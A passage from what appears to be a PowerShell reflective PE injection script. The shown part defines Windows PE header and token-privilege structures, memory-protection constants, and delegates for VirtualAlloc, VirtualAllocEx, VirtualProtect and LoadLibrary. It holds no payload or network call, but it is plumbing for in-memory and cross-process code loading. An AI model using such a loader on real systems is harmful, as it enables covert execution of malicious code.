		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
